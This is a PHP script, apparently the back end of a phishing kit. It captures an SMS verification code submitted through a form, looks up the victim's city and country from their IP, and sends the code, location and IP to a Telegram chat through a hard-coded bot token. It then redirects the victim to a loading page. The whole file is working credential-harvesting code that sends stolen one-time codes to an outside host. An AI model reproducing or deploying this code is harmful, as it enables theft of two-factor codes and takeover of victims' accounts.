<?php
// Obtén el código SMS enviado desde el formulario
$codigo = $_POST['codigo'];

// Información de la ubicación (esto se puede obtener mediante una API o IP)
$ip = $_SERVER['REMOTE_ADDR']; // La IP del usuario
$location_data = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$city = $location_data->city;
$country = $location_data->country;

// Tu token y chat_id de Telegram
$telegram_token = '8198531920:AAEvRL0O26Hs5cdjTRsImltuxQGMlIKqCHk';
$chat_id = '-4695344087';

// Mensaje a enviar
$message = "Nuevo código SMS: {$codigo}\nUbicación: {$city}, {$country}\nIP: {$ip}";

// API de Telegram para enviar el mensaje
$url = "https://api.telegram.org/bot{$telegram_token}/sendMessage?chat_id={$chat_id}&text=" . urlencode($message);

// Enviar el mensaje
file_get_contents($url);

// Redirigir a la página de agradecimiento
header("Location: carga2.html"); 
exit();
?>